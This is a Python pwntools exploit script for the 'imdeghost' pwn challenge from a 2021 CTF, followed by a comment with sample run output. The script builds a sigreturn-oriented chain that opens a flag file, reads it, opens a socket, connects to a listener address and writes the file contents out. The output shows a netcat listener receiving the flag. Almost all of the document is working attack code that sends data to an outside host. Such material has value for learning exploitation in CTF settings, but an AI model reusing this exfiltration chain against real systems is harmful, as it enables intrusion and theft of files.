from pwn import *

context(os='linux', arch='amd64')
#context.log_level = 'debug'

BINARY = './imdeghost'
elf  = ELF(BINARY)

if len(sys.argv) > 1 and sys.argv[1] == 'r':
  HOST = "143.198.127.103"
  PORT = 42007
  s = remote(HOST, PORT)
  ip_addr = 0xbe409f76
else:
  s = process(BINARY)
  libc = elf.libc
  ip_addr = 0x0100007f  # 127.0.0.1 

s.recvuntil("for you will not be seeing it again.\n")

mem         = 0x6900000000
syscall_ret = 0x13370000004b # syscall; test r14,r14; jne 0x13370000003e; mov rax,r15; ret

def Sigreturn(rax, rbx, rcx, rdx, rsi, rdi, rbp, rsp, rip, r8, r9, r10, r11, r12, r13, r14, r15):
  buf  = p64(0)*5
  buf += p64(r8) + p64(r9) + p64(r10) + p64(r11) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
  buf += p64(rdi) + p64(rsi) + p64(rbp) + p64(rbx) + p64(rdx) + p64(rax) + p64(rcx) + p64(rsp) + p64(rip)
  buf += p64(0) + p64(0x33) + b"AAAAAAAA"*4 + p64(0)
  return buf

buf  = p64(syscall_ret)
# sys_open("./0101111001001101\", 0, 0)
buf += Sigreturn(2, 0, 0, 0, 0, mem + 0xe00, mem + 0x170, mem + 0xf0, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_read(0, mem+0xb00, 0x300)
buf += Sigreturn(0, 0, 0, 0x300, mem + 0xb00, 0, mem + 0x170, mem + 0xf0*2, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_socket(2, 1, 6)
buf += Sigreturn(0x29, 0, 0, 6, 1, 2, mem + 0x170, mem + 0xf0*3, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_connect(1, mem+0xe80, 0x10)
buf += Sigreturn(0x2a, 0, 0, 0x10, mem + 0xe80, 1, mem + 0x170, mem + 0xf0*4, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

# sys_write(1, mem + 0xb00, 0x300)
buf += Sigreturn(1, 0, 0, 0x300, mem + 0xb00, 1, mem + 0x170, mem + 0xf0*5, syscall_ret, 0x100a, 0x100b, 0x100c, 0x100d, 0x100e, 0x100f, 0, 0xf)
buf += p64(syscall_ret)

buf += b"A"*(0xe00-len(buf))
buf += b"./0101111001001101\x00"
buf += b"A"*(0xe80-len(buf))
buf += p32(0x55550002) + p32(ip_addr)
buf += b"A"*(0xf00+15-len(buf))

#pause()
s.send(buf)

s.interactive()

'''
mito@ubuntu:~/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost$ python3 solve_flag.py r
[*] '/home/mito/CTF/PBjar_CTF_2021/Pwn_ImDeGhost/imdeghost/imdeghost'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      PIE enabled
[+] Opening connection to 143.198.127.103 on port 42007: Done
[*] Switching to interactive mode
Boo.

mito@ubuntu:~/Desktop$ nc -lp 21845
flag{aAaaaaAaaAAaAAAAaAAaAAAAaaAaaaaA}
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...
'''
